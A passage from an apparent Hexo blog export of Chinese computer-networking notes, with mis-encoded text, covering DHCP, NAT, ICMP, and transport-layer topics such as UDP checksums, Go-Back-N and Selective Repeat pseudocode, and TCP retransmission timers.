<h5 id="ç›¸æ¯”-IPv4-çš„æ”¹å˜"><a href="#ç›¸æ¯”-IPv4-çš„æ”¹å˜" class="headerlink" title="ç›¸æ¯” IPv4 çš„æ”¹å˜"></a>ç›¸æ¯” IPv4 çš„æ”¹å˜</h5><ul>
<li><strong>æ£€éªŒå’Œ</strong>ï¼šå½»åº•ç§»é™¤ï¼Œæ¯è·³å¤„ç†æ—¶é—´å¤§å¤§å‡å°‘ã€‚</li>
<li><strong>é€‰é¡¹</strong>ï¼šä»åŸºæœ¬é¦–éƒ¨ç§»å‡ºå˜ä¸ºå¯é€‰ï¼Œè·¯ç”±å™¨è½¬å‘æ—¶é—´å‡å°‘ã€‚</li>
</ul>
<h2 id="DHCP-åè®®"><a href="#DHCP-åè®®" class="headerlink" title="DHCP åè®®"></a>DHCP åè®®</h2><p>ä¸»æœºä» DHCP æœåŠ¡å™¨åŠ¨æ€è·å– IP åœ°å€ã€å­ç½‘æ©ç ã€é»˜è®¤ç½‘å…³ã€DNS æœåŠ¡å™¨åç§°ä¸åœ°å€ç­‰ä¿¡æ¯ã€‚</p>
<p><img src="https://i.loli.net/2020/01/29/Y1FasAxPQzDW8Id.png" alt="DHCP"></p>
<p>DHCP åè®®åœ¨<strong>åº”ç”¨å±‚</strong>å®ç°ï¼š</p>
<ul>
<li>è¯·æ±‚æŠ¥æ–‡å°è£…åˆ° <strong>UDP</strong> æ•°æ®æŠ¥ä¸­</li>
<li>IP å¹¿æ’­</li>
<li>é“¾è·¯å±‚å¹¿æ’­</li>
</ul>
<h4 id="ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰"><a href="#ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰" class="headerlink" title="ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰"></a>ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰</h4><p>å¤šä¸ªç§æœ‰ IP åœ°å€ç»„æˆçš„å†…ç½‘é€šè¿‡ NAT è½¬æ¢æˆç»Ÿä¸€çš„å…¬æœ‰ IP åœ°å€ä¸å¤–ç½‘é€šä¿¡ã€‚</p>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li>åªå‘ ISP ç”³è¯·ä¸€ä¸ª IP åœ°å€</li>
<li>æœ¬åœ°è®¾å¤‡å˜æ›´ IP åœ°å€å¯¹å¤–ç½‘æ˜¯é€æ˜çš„</li>
<li>å˜æ›´ ISP æ—¶ï¼Œæ— éœ€ä¿®æ”¹å†…ç½‘è®¾å¤‡çš„ IP åœ°å€</li>
<li>å†…ç½‘è®¾å¤‡å¯¹å¤–ç½‘ä¸å¯è§ï¼ˆå®‰å…¨ï¼‰</li>
</ul>
<p>å®ç°ï¼š</p>
<ul>
<li>æ›¿æ¢ï¼šåˆ©ç”¨ï¼ˆNAT IP åœ°å€ï¼Œæ–°ç«¯å£å·ï¼‰æ›¿æ¢æ¯ä¸ª<strong>å¤–å‡º IP æ•°æ®æŠ¥</strong>çš„ï¼ˆæº IP åœ°å€ï¼Œæºç«¯å£å·ï¼‰</li>
<li>è®°å½•ï¼šå°†æ¯å¯¹ï¼ˆNAT IP åœ°å€ï¼Œæ–°ç«¯å£å·ï¼‰ä¸ï¼ˆæº IP åœ°å€ï¼Œæºç«¯å£å·ï¼‰çš„æ›¿æ¢ä¿¡æ¯å­˜å‚¨åˆ° <strong>NAT è½¬æ¢è¡¨</strong> ä¸­</li>
<li>æ›¿æ¢ï¼šæ ¹æ® NAT è½¬æ¢è¡¨ï¼Œåˆ©ç”¨ï¼ˆæº IP åœ°å€ï¼Œæºç«¯å£å·ï¼‰æ›¿æ¢æ¯ä¸ª<strong>è¿›å…¥å†…ç½‘ IP æ•°æ®æŠ¥</strong>çš„ï¼ˆç›®çš„ IP åœ°å€ï¼Œç›®çš„ç«¯å£å·ï¼‰ï¼Œå³ï¼ˆNAT IP åœ°å€ï¼Œæ–°ç«¯å£å·ï¼‰</li>
</ul>
<p><img src="https://i.loli.net/2020/01/29/ZU9wXMSGixCm1Kf.png" alt="NATè¿‡ç¨‹"></p>
<p><strong>å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡å™¨çš„ IP æŠ¥æ–‡ï¼Œæº IP ä¸å˜ï¼Œç›®çš„ IP éšè·³è·ƒæ”¹å˜ï¼ŒæœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„ IP æŠ¥æ–‡ï¼Œæº IP éšè·³è·ƒæ”¹å˜ï¼Œç›®çš„ IP ä¸å˜</strong>ã€‚</p>
<p>NAT ç©¿é€ï¼š</p>
<ul>
<li>ç«¯å£è½¬å‘ï¼šé…ç½®è·¯ç”±å™¨ï¼Œå°†å¤–éƒ¨å®¢æˆ·å¯¹ç‰¹å®šç«¯å£çš„è¯·æ±‚è½¬å‘ç»™ç‰¹å®šå†…éƒ¨æœåŠ¡å™¨</li>
<li>ä¸­ç»§ï¼šå†…ã€å¤–éƒ¨å®¢æˆ·åˆ†åˆ«ä¸ä¸­ç»§æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚ä¸­ç»§æœåŠ¡å™¨æ¡¥æ¥ä¸¤ä¸ªè¿æ¥çš„åˆ†ç»„ï¼ˆskypeã€frp ç­‰åº”ç”¨éƒ½åŸºäºæ­¤ï¼‰<br><img src="https://i.loli.net/2020/01/30/7BtAgQ8hsUYOklC.png" alt="ä¸­ç»§"></li>
</ul>
<h2 id="ICMP-åè®®"><a href="#ICMP-åè®®" class="headerlink" title="ICMP åè®®"></a>ICMP åè®®</h2><p>å½“ IP æ•°æ®æŠ¥ä¼ è¾“å‡ºé”™<strong>è¢«ä¸¢å¼ƒ</strong>æ—¶ï¼Œè·¯ç”±å™¨å‘æºä¸»æœºå‘é€ ICMP æŠ¥æ–‡ã€‚</p>
<p>åŠŸèƒ½ï¼š</p>
<ul>
<li>å¼‚å¸¸æŠ¥å‘Š</li>
<li>ç½‘ç»œæ¢è¯¢</li>
</ul>
<p>ä¸¤ç±» ICMP æŠ¥æ–‡ï¼š</p>
<ul>
<li>å·®é”™æŠ¥å‘ŠæŠ¥æ–‡ï¼ˆ5 ç§ï¼‰ï¼š<ul>
<li>ç›®çš„ä¸å¯è¾¾</li>
<li>æºæŠ‘åˆ¶ï¼šè·¯ç”±å™¨å‘ç°ç½‘ç»œæ‹¥å¡ï¼Œæç¤ºè¦é™ä½å‘é€é€Ÿç‡</li>
<li>è¶…æ—¶ï¼šTTL è¶…æ—¶</li>
<li>å‚æ•°é”™è¯¯ï¼šè·¯ç”±å™¨å‘ç°åˆ†ç»„æŸäº›å­—æ®µæœ‰é—®é¢˜</li>
<li>é‡å®šå‘ï¼šè·¯ç”±å™¨å‘ç°è¿™ä¸ªåˆ†ç»„ä¸åº”è¯¥ç”±å®ƒè½¬å‘</li>
</ul>
</li>
<li>ç½‘ç»œæ¢è¯¢æŠ¥æ–‡ï¼ˆ2 ç§ï¼‰ï¼š<ul>
<li>å›å£°è¯·æ±‚ä¸åº”ç­”æŠ¥æ–‡ã€‚ping åŸºäºæ­¤</li>
<li>æ—¶é—´æˆ³è¯·æ±‚ä¸åº”ç­”æŠ¥æ–‡ï¼šè¯·æ±‚è·å¾—æ—¶é—´æˆ³</li>
</ul>
</li>
</ul>
<p>ICMP æŠ¥æ–‡å°è£…åˆ° IP æ•°æ®æŠ¥ä¸­ä¼ è¾“ï¼š<br><img src="https://i.loli.net/2020/01/30/32BVGCpILAkHbdU.png" alt="ICMPæ ¼å¼"></p>
<p>ICMP æŠ¥æ–‡å°è£…äº†è¢«ä¸¢å¼ƒçš„å·®é”™ IP æ•°æ®æŠ¥çš„é¦–éƒ¨å’Œå‰ 8bytes æ•°æ®ï¼ˆè¿™ 8 bytes é€šå¸¸ä¸º UDP é¦–éƒ¨æˆ– TCP éƒ¨åˆ†é¦–éƒ¨ï¼‰ï¼š<br><img src="https://i.loli.net/2020/01/30/rIVjqRGvF5Hc1N8.png" alt="ICMPæ•°æ®éƒ¨åˆ†"></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå±‚</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹ä¼ è¾“å±‚</title>
    <url>/2020/01/22/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    <content><![CDATA[<p>æœ¬å±‚å°†ä¼šæ¶‰åŠä¼ è¾“å±‚ TCP/UDP åè®®çš„å¤ç”¨/åˆ†ç”¨ã€å¯é æ•°æ®ä¼ è¾“ã€æµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶ã€‚</p>
<span id="more"></span>

<h2 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h2><p>ä¼ è¾“å±‚åè®®ä¸ºè¿è¡Œåœ¨ä¸åŒ Host ä¸Šçš„<strong>è¿›ç¨‹</strong>æä¾›äº†ä¸€ç§é€»è¾‘é€šä¿¡æœºåˆ¶ã€‚æ‰€è°“é€»è¾‘é€šä¿¡ï¼ŒæŒ‡å‘é€æ–¹æ¥æ”¶æ–¹åƒæ˜¯ç›´æ¥é€šä¿¡ï¼Œä¸‹é¢çš„åè®®æ˜¯é€æ˜çš„ã€‚</p>
<p>ä¼ è¾“å±‚ä¸ç½‘ç»œå±‚ä¸åŒåœ¨äºä¼ è¾“å±‚æä¾›è¿›ç¨‹ä¹‹é—´é€»è¾‘é€šä¿¡ï¼Œç½‘ç»œå±‚æä¾›ä¸»æœºä¹‹é—´é€»è¾‘é€šä¿¡ã€‚</p>
<h2 id="å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†ç”¨"><a href="#å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†ç”¨" class="headerlink" title="å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†ç”¨"></a>å¤šè·¯å¤ç”¨ä¸å¤šè·¯åˆ†ç”¨</h2><p>æŸå±‚ä¸€ä¸ªåè®®ç›´æ¥å¯¹åº”ä¸Šå±‚å¤šä¸ªåè®®/å®ä½“ï¼Œåˆ™éœ€è¦å¤ç”¨/åˆ†ç”¨ã€‚</p>
<ul>
<li>å¤šè·¯å¤ç”¨ï¼šä¼ è¾“å±‚ä»å¤šä¸ª socket æ¥æ”¶æ•°æ®ï¼Œè¿›è¡Œå¤´éƒ¨å°è£…åäº¤ç»™ç½‘ç»œå±‚ã€‚</li>
<li>å¤šè·¯åˆ†ç”¨ï¼šä¼ è¾“å±‚ä»ç½‘ç»œå±‚æ¥æ”¶æ•°æ®ï¼Œæ ¹æ®å¤´éƒ¨ä¿¡æ¯åˆ†å‘ç»™å¤šä¸ª socketã€‚</li>
</ul>
<h2 id="TCP-UDP-çš„å¤šè·¯å¤ç”¨åˆ†ç”¨"><a href="#TCP-UDP-çš„å¤šè·¯å¤ç”¨åˆ†ç”¨" class="headerlink" title="TCP/UDP çš„å¤šè·¯å¤ç”¨åˆ†ç”¨"></a>TCP/UDP çš„å¤šè·¯å¤ç”¨åˆ†ç”¨</h2><p>UDP socket é€šè¿‡<strong>ç›®çš„ç«¯å£å·</strong>å”¯ä¸€ç¡®å®šï¼Œæ¥è‡ªä¸åŒå®¢æˆ·ç«¯æœ‰ç›¸åŒç›®çš„ç«¯å£çš„ UDP æŠ¥æ–‡ä¼šè¢«å‘åˆ°ç›¸åŒçš„æœåŠ¡å™¨ socket ä¸Šã€‚</p>
<p>TCP socket é€šè¿‡<strong>åŸIPï¼Œç›®çš„IPï¼Œ åŸç«¯å£å·ï¼Œç›®çš„ç«¯å£å·</strong>å”¯ä¸€ç¡®å®šï¼Œæ¥è‡ªä¸åŒå®¢æˆ·ç«¯æœ‰ç›¸åŒç›®çš„ç«¯å£çš„ TCP æŠ¥æ–‡ä¼šè¢«å‘åˆ°ä¸åŒçš„æœåŠ¡å™¨ socket ä¸Šã€‚</p>
<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><ul>
<li>å¤ç”¨/åˆ†ç”¨</li>
<li>é”™è¯¯æ ¡éªŒï¼ˆæ— çº é”™ï¼‰</li>
</ul>
<p>å±äº<code>æ— è¿æ¥</code>åè®®ï¼Œæä¾›<code>å°½åŠ›è€Œä¸º</code>çš„æœåŠ¡ã€‚æŠ¥æ–‡å¯èƒ½ä¸¢å¤±ï¼Œå¯èƒ½éæŒ‰åºåˆ°è¾¾ã€‚</p>
<p><img src="https://i.loli.net/2020/01/23/ubYceGtf5DmOdLH.png" alt="UDPæŠ¥æ–‡æ ¼å¼"></p>
<p>checksumï¼šæ ¡éªŒå’Œã€‚è´Ÿè´£é”™è¯¯æ ¡éªŒã€‚</p>
<p><img src="https://i.loli.net/2020/01/23/AL6TqEfa3YwcnVh.png" alt="è®¡ç®—æ ¡éªŒå’Œ"></p>
<p><img src="https://i.loli.net/2020/01/23/3qEVYFGcfWjK1I5.png" alt="è®¡ç®—ç¤ºä¾‹"></p>
<h3 id="ä¸ºä»€ä¹ˆåœ¨ä¼ è¾“å±‚åšé“¾è·¯æ£€æµ‹"><a href="#ä¸ºä»€ä¹ˆåœ¨ä¼ è¾“å±‚åšé“¾è·¯æ£€æµ‹" class="headerlink" title="ä¸ºä»€ä¹ˆåœ¨ä¼ è¾“å±‚åšé“¾è·¯æ£€æµ‹"></a>ä¸ºä»€ä¹ˆåœ¨ä¼ è¾“å±‚åšé“¾è·¯æ£€æµ‹</h3><p>ä¼ è¾“å±‚æ˜¯ç«¯åˆ°ç«¯åè®®ï¼Œä¸èƒ½ç¡®ä¿è¿™å±‚ä»¥ä¸‹çš„å±‚æ¬¡éƒ½æœ‰é”™è¯¯æ ¡éªŒæœºåˆ¶ã€‚å› æ­¤éœ€è¦åœ¨ç¦»åº”ç”¨å±‚æœ€è¿‘çš„è¿™ä¸€å±‚åšé”™è¯¯æ ¡éªŒã€‚</p>
<h3 id="ä¼˜åŠ¿"><a href="#ä¼˜åŠ¿" class="headerlink" title="ä¼˜åŠ¿"></a>ä¼˜åŠ¿</h3><ul>
<li>å»¶è¿Ÿä½ï¼ˆæ— è¿æ¥ï¼‰ã€‚</li>
<li>å®ç°ç®€å•ï¼ˆä¸ç»´æŠ¤è¿æ¥çŠ¶æ€ï¼‰ã€‚</li>
<li>å¤´éƒ¨å¼€é”€å°‘ï¼ˆåªéœ€ 8bytesï¼Œè€Œ TCP å¤´éƒ¨éœ€è¦ 20bytesï¼‰ã€‚</li>
<li>æ²¡æœ‰æ‹¥å¡æ§åˆ¶ï¼Œå¯ä»¥æ§åˆ¶å‘é€æ—¶é—´å’Œé€Ÿç‡ã€‚</li>
</ul>
<h2 id="å¯é æ•°æ®ä¼ è¾“"><a href="#å¯é æ•°æ®ä¼ è¾“" class="headerlink" title="å¯é æ•°æ®ä¼ è¾“"></a>å¯é æ•°æ®ä¼ è¾“</h2><p>å¯é ï¼š<strong>ä¸é”™ï¼ˆå¸¦çº é”™ï¼‰</strong>ï¼Œ<strong>ä¸ä¸¢</strong>ï¼Œ<strong>ä¸ä¹±</strong>ã€‚</p>
<h3 id="ä¸é”™"><a href="#ä¸é”™" class="headerlink" title="ä¸é”™"></a>ä¸é”™</h3><p>åˆ©ç”¨<strong>æ ¡éªŒå’Œ</strong>æ£€æµ‹ä½é”™è¯¯ã€‚å¦‚æœæœ‰é”™è¯¯ï¼Œå°è¯•è¿›è¡Œæ¢å¤ã€‚</p>
<h4 id="å¦‚ä½•ä»é”™è¯¯ä¸­æ¢å¤"><a href="#å¦‚ä½•ä»é”™è¯¯ä¸­æ¢å¤" class="headerlink" title="å¦‚ä½•ä»é”™è¯¯ä¸­æ¢å¤"></a>å¦‚ä½•ä»é”™è¯¯ä¸­æ¢å¤</h4><p><strong>ç¡®è®¤ï¼ˆAcknowledgementsï¼ŒACKï¼‰</strong>ï¼šæ¥æ”¶æ–¹æ˜¾ç¤ºå‘ŠçŸ¥å‘é€æ–¹åˆ†ç»„å·²æ­£ç¡®æ¥æ”¶ã€‚</p>
<p><strong>NAK</strong>ï¼šæ¥æ”¶æ–¹æ˜¾ç¤ºå‘ŠçŸ¥å‘é€æ–¹åˆ†ç»„é”™è¯¯ã€‚</p>
<p>å‘é€æ–¹æ”¶åˆ° NAK åï¼Œ<strong>é‡ä¼ </strong>åˆ†ç»„ã€‚å¦‚æœæ”¶åˆ°çš„ ACK/NAK åæ‰ï¼Œ<strong>é‡ä¼ </strong>åˆ†ç»„ã€‚</p>
<h4 id="è§£å†³é‡ä¼ åˆ†ç»„é‡å¤é—®é¢˜"><a href="#è§£å†³é‡ä¼ åˆ†ç»„é‡å¤é—®é¢˜" class="headerlink" title="è§£å†³é‡ä¼ åˆ†ç»„é‡å¤é—®é¢˜"></a>è§£å†³é‡ä¼ åˆ†ç»„é‡å¤é—®é¢˜</h4><p><strong>åºåˆ—å·</strong>ï¼šå‘é€æ–¹ç»™æ¯ä¸ªåˆ†ç»„å¢åŠ åºåˆ—å·ã€‚æ¥æ”¶æ–¹ä¸¢å¼ƒé‡å¤åˆ†ç»„ã€‚</p>
<p>å¦‚æœæ¥æ”¶æ–¹ç”¨ ACK å‘ŠçŸ¥æœ€åä¸€ä¸ªæ­£ç¡®æ¥æ”¶åˆ†ç»„çš„åºåˆ—å·ï¼Œå¯ä»¥ä¸ä½¿ç”¨ NAKã€‚</p>
<h3 id="ä¸ä¸¢"><a href="#ä¸ä¸¢" class="headerlink" title="ä¸ä¸¢"></a>ä¸ä¸¢</h3><p>å‘é€æ–¹ç­‰å¾…â€œ<strong>åˆç†</strong>â€æ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´å†…æ²¡æ”¶åˆ° ACKï¼Œ<strong>é‡ä¼ </strong>åˆ†ç»„ã€‚å¦‚æœè¿™ä¸ªæ—¶é—´è®¾ç½®è¿‡çŸ­ï¼Œä¾ç„¶èƒ½æ­£å¸¸é€šä¿¡ï¼Œä½†æ˜¯ä¼šäº§ç”Ÿå†—ä½™åŒ…ï¼š</p>
<p><img src="https://i.loli.net/2020/01/23/RbD1VtK29OyFfQW.png" alt="ç­‰å¾…æ—¶é—´è¿‡çŸ­"></p>
<h3 id="æé«˜æ€§èƒ½ï¼ˆä¸ä¹±ï¼‰"><a href="#æé«˜æ€§èƒ½ï¼ˆä¸ä¹±ï¼‰" class="headerlink" title="æé«˜æ€§èƒ½ï¼ˆä¸ä¹±ï¼‰"></a>æé«˜æ€§èƒ½ï¼ˆä¸ä¹±ï¼‰</h3><p>åˆ©ç”¨<strong>æµæ°´çº¿æœºåˆ¶</strong>ä¸<strong>æ»‘åŠ¨çª—å£åè®®</strong>ã€‚ä¸ºäº†å®ç°æµæ°´çº¿æœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p>
<ul>
<li>æ›´å¤§çš„<strong>åºåˆ—å·èŒƒå›´</strong></li>
<li>æ›´å¤§çš„å­˜å‚¨ç©ºé—´ä»¥<strong>ç¼“å­˜åˆ†ç»„</strong></li>
</ul>
<h4 id="æ»‘åŠ¨çª—å£åè®®"><a href="#æ»‘åŠ¨çª—å£åè®®" class="headerlink" title="æ»‘åŠ¨çª—å£åè®®"></a>æ»‘åŠ¨çª—å£åè®®</h4><p>çª—å£ï¼šå…è®¸ä½¿ç”¨çš„åºåˆ—å·èŒƒå›´ Nã€‚</p>
<p>æ»‘åŠ¨çª—å£ï¼šéšç€åè®®çš„è¿è¡Œï¼Œçª—å£åœ¨åºåˆ—å·ç©ºé—´å†…<strong>å‘å‰æ»‘åŠ¨</strong>ã€‚</p>
<p><img src="https://i.loli.net/2020/01/23/GAiYTnW2vMxeUoX.png" alt="æ»‘åŠ¨çª—å£"></p>
<h5 id="GBNï¼ˆåé€€Nå¸§ï¼‰-åè®®"><a href="#GBNï¼ˆåé€€Nå¸§ï¼‰-åè®®" class="headerlink" title="GBNï¼ˆåé€€Nå¸§ï¼‰ åè®®"></a>GBNï¼ˆåé€€Nå¸§ï¼‰ åè®®</h5><p>é‡‡ç”¨<strong>ç´¯ç§¯ç¡®è®¤æœºåˆ¶</strong>ï¼ŒACK(n)ï¼šç¡®è®¤åˆ°åºåˆ—å· nï¼ˆåŒ…å«nï¼‰çš„åˆ†ç»„å·²è¢«æ­£ç¡®æ¥å—ã€‚ä¸ºåˆ†ç»„è®¾ç½®<strong>å®šæ—¶å™¨</strong>ã€‚</p>
<p>è¶…æ—¶äº‹ä»¶Timeout(n)ï¼šé‡ä¼ åºåˆ—å·å¤§äºç­‰äº n çš„æ‰€æœ‰æœªç¡®è®¤åˆ†ç»„ã€‚</p>
<p>å‘é€æ–¹ç»´æŠ¤ä¸¤ä¸ªå˜é‡ï¼šbase and nextseqnumï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextseqnum &lt; base + N) &#123;    <span class="comment">// å¦‚æœæœ‰çª—å£å†…æœ‰å¯ç”¨åºåˆ—å·</span></span><br><span class="line">    udt_send(packet[nextseqnum])    <span class="comment">// å‘é€ç¼–å·ä¸º nextseqnum çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum)</span><br><span class="line">        start_timer;    <span class="comment">// å¼€å§‹å®šæ—¶å™¨</span></span><br><span class="line">    nextseqnum++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    refuse_data(data);  <span class="comment">// æ‹’ç»å‘é€</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> timeout <span class="keyword">or</span> <span class="title">corrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// å¦‚æœè¶…æ—¶æˆ–æ”¶åˆ°æŸåçš„ ACK</span></span><br><span class="line">        start_timer;    <span class="comment">// é‡ç½®å®šæ—¶å™¨</span></span><br><span class="line">        udt_send(data[base])</span><br><span class="line">        ...</span><br><span class="line">        udt_send(data[nextseqnum<span class="number">-1</span>])    <span class="comment">// é‡ä¼ æ‰€æœ‰æœªç¡®è®¤åˆ†ç»„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">if</span> <span class="title">notcorrupt</span><span class="params">(rcvpkt)</span> </span>&#123; <span class="comment">// å¦‚æœæ­£å¸¸æ”¶åˆ° ACK</span></span><br><span class="line">    base = getacknum(rcvpkt) + <span class="number">1</span>;   <span class="comment">// æ›´æ–° baseï¼Œçª—å£å‘å‰æ»‘åŠ¨ï¼</span></span><br><span class="line">    <span class="keyword">if</span> (base == nextseqnum) <span class="comment">// æ‰€æœ‰å·²å‘é€åˆ†ç»„å‡è¢«æ­£ç¡®æ¥æ”¶</span></span><br><span class="line">        stop_timer;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        start_timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥æ”¶æ–¹å€¼åªè®°ä½ä¸€ä¸ªå˜é‡ expectedseqnumï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> !corrupt(rcvpkt) <span class="function"><span class="keyword">and</span> <span class="title">hasseqnum</span><span class="params">(rcvpkt, expectedseqnum)</span> </span>&#123; <span class="comment">// å¦‚æœæ­£ç¡®æ¥æ”¶åˆ†ç»„</span></span><br><span class="line">    data = extract(rcvpkt);</span><br><span class="line">    deliver(data);  <span class="comment">// å‘åº”ç”¨å±‚ä¼ é€’æ•°æ®</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);   <span class="comment">// å‘é€ ACK(expectedseqnum)</span></span><br><span class="line">    expectednum++;  <span class="comment">// æ›´æ–° expectedseqnum</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="comment">// åˆ†ç»„æŸå or ä¹±åºåˆ°è¾¾ï¼šç›´æ¥ä¸¢å¼ƒ</span></span><br><span class="line">    udt_send(expectednum, ACK, checksum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/23/tzYge7b6PmEK2CD.png" alt="GBNç¤ºä¾‹"></p>
<h5 id="SRï¼ˆé€‰æ‹©é‡ä¼ ï¼‰åè®®"><a href="#SRï¼ˆé€‰æ‹©é‡ä¼ ï¼‰åè®®" class="headerlink" title="SRï¼ˆé€‰æ‹©é‡ä¼ ï¼‰åè®®"></a>SRï¼ˆé€‰æ‹©é‡ä¼ ï¼‰åè®®</h5><p>æ¥æ”¶æ–¹å¯¹æ¯ä¸ªåˆ†ç»„<strong>å•ç‹¬ç¡®è®¤</strong>ï¼Œè®¾ç½®<strong>ç¼“å­˜æœºåˆ¶</strong>ï¼Œç¼“å­˜ä¹±åºåˆ°è¾¾åˆ†ç»„ã€‚å‘é€æ–¹åªé‡ä¼ æ²¡æ”¶åˆ° ACK çš„åˆ†ç»„ï¼Œä¸ºæ¯ä¸ªåˆ†ç»„éƒ½è®¾ç½®å®šæ—¶å™¨ã€‚</p>
<p>åœ¨æ¥æ”¶æ–¹ï¼Œæˆ‘ä»¬ä¹Ÿè®¾ç½®ä¸€ä¸ªçª—å£ï¼š<br><img src="https://i.loli.net/2020/01/23/tROCeGoPl3svUqp.png" alt="SRå‘é€æ¥æ”¶çª—å£"></p>
<p><img src="https://i.loli.net/2020/01/23/thXiMKGmVSgLpqN.png" alt="SRå‘é€æ¥æ”¶åˆ†å·¥"></p>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP çš„å¯é æ•°æ®ä¼ è¾“ï¼Œ<strong>æ—¢ä¸æ˜¯ GBNï¼Œä¹Ÿä¸æ˜¯ SR</strong>ï¼</p>
<ul>
<li>å¤ç”¨/åˆ†ç”¨</li>
<li>ç‚¹å¯¹ç‚¹ä¼ è¾“</li>
<li>æµæ°´çº¿æœºåˆ¶</li>
<li>å‘é€æ–¹/æ¥æ”¶æ–¹ç¼“å­˜ï¼ˆSRï¼‰</li>
<li>åŒå…¨å·¥</li>
<li>é¢å‘è¿æ¥</li>
<li>æµé‡æ§åˆ¶</li>
</ul>
<p><img src="https://i.loli.net/2020/01/24/wyvrUqoTia52AuN.png" alt="TCPæ ¼å¼"></p>
<p>åºåˆ—å·æŒ‡ segment ä¸­ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·è€Œä¸æ˜¯ segment çš„ç¼–å·ï¼Œå»ºç«‹ TCP è¿æ¥æ—¶ï¼ŒåŒæ–¹éšæœºé€‰æ‹©åºåˆ—å·ã€‚</p>
<p>ACKs æŒ‡å¸Œæœ›æ”¶åˆ°çš„ä¸‹ä¸€å­—èŠ‚åºåˆ—å·ï¼Œä½¿ç”¨<strong>ç´¯è®¡ç¡®è®¤</strong>æœºåˆ¶ï¼ˆGBNï¼‰ã€‚</p>
<h3 id="è§¦å‘é‡ä¼ çš„äº‹ä»¶"><a href="#è§¦å‘é‡ä¼ çš„äº‹ä»¶" class="headerlink" title="è§¦å‘é‡ä¼ çš„äº‹ä»¶"></a>è§¦å‘é‡ä¼ çš„äº‹ä»¶</h3><ul>
<li>è¶…æ—¶</li>
<li>æ”¶åˆ°é‡å¤ ACK</li>
</ul>
<p>TCP åªä½¿ç”¨<strong>ä¸€ä¸ªè®¡æ—¶å™¨</strong>ã€‚</p>
<h3 id="è®¾ç½®å®šæ—¶å™¨è¶…æ—¶æ—¶é—´"><a href="#è®¾ç½®å®šæ—¶å™¨è¶…æ—¶æ—¶é—´" class="headerlink" title="è®¾ç½®å®šæ—¶å™¨è¶…æ—¶æ—¶é—´"></a>è®¾ç½®å®šæ—¶å™¨è¶…æ—¶æ—¶é—´</h3><p>SampleRTTï¼šä»æ®µå‘å‡ºåˆ°æ”¶åˆ° ACK ç”¨æ—¶ã€‚</p>
<p>EstimatedRTTï¼šå¤šä¸ª SampleRTT åŠ æƒå¹³å‡å€¼ã€‚</p>
<p>è¶…æ—¶æ—¶é—´é—´éš”ï¼ˆTimeoutIntervalï¼‰ = EstimatedRTT + å®‰å…¨è¾¹ç•Œï¼ˆDevRTTï¼‰</p>
<p><img src="https://i.loli.net/2020/01/24/dYT7Aiw95bBxcKN.png" alt="EstimatedRTTæ±‚å€¼"></p>
<p><img src="https://i.loli.net/2020/01/24/HZdy1zDrj56MXFc.png" alt="DevRTTæ±‚å€¼"></p>
<p><img src="https://i.loli.net/2020/01/24/EJGCumZoVlyWIpe.png" alt="è¶…æ—¶æ—¶é—´é—´éš”æ±‚å€¼"></p>
<h3 id="å¿«é€Ÿé‡ä¼ "><a href="#å¿«é€Ÿé‡ä¼ " class="headerlink" title="å¿«é€Ÿé‡ä¼ "></a>å¿«é€Ÿé‡ä¼ </h3><p>é€šè¿‡æ£€æµ‹å¤šä¸ªé‡å¤çš„ ACKï¼Œå‘é€æ–¹ç¡®è®¤æŸä¸ªåˆ†ç»„å·²ç»ä¸¢å¤±ã€‚å¿«é€Ÿé‡ä¼ å¯ä»¥åœ¨å®šæ—¶å™¨è¶…æ—¶ä¹‹å‰å³è¿›è¡Œé‡ä¼ ã€‚</p>
<p>å¦‚æœå‘é€æ–¹æ”¶åˆ°å¯¹æŸä¸€æ•°æ®çš„ 3 ä¸ª ACKï¼Œåˆ™å¯åŠ¨å¿«é€Ÿé‡ä¼ æœºåˆ¶ã€‚</p>
